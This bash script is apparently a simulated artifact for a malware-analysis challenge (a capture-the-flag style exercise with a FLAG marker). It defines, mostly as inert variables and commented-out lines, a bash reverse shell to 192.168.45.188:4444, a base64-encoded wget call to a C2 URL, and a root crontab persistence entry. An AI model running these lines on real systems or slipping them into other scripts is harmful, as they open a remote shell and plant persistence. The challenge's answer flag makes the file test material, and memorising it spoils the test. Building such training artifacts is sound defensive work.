#!/bin/bash
# ==============================================================================
# AstraNex Defence Technical Security Evaluation - SAFE SIMULATED ARTIFACT
# File: telemetry_update.sh
# Purpose: Stage 6 Malware / Script Analysis Challenge
# THIS SCRIPT IS NON-MALICIOUS AND DOES NOT PERFORM HARMFUL ACTIONS.
# ==============================================================================

set -e

# Incident ID: ASTRA-INC-AX07-0926
# Asset: UGV AX-07

echo "[+] AstraNex Telemetry Agent Maintenance Subsystem v2.4.1"

# Obfuscated C2 Trigger URL (Base64)
# Decode instruction: echo "d2dldCBodHRwOi8vMTkyLjE2OC40NS4xODg6ODA4MC9heDA3X2MydHJpZ2dlcg==" | base64 -d
ENCODED_C2_URL="d2dldCBodHRwOi8vMTkyLjE2OC40NS4xODg6ODA4MC9heDA3X2MydHJpZ2dlcg=="

C2_IP="192.168.45.188"
C2_PORT="8080"
PERSISTENCE_CRON="*/15 * * * * root /tmp/.telemetry_update.sh"
REVERSE_SHELL_SIM="bash -i >& /dev/tcp/192.168.45.188/4444 0>&1"

echo "[*] Establishing persistence in system scheduler..."
# Simulated persistence routine:
# echo "${PERSISTENCE_CRON}" >> /etc/crontab

echo "[*] Initializing telemetry stream override..."
# Simulated beaconing:
# $(echo "${ENCODED_C2_URL}" | base64 -d)

# IOC Marker:
# FLAG{MALWARE_PERSISTENCE_CRON_EXPOSED_4812}

echo "[+] Telemetry maintenance script evaluation complete."
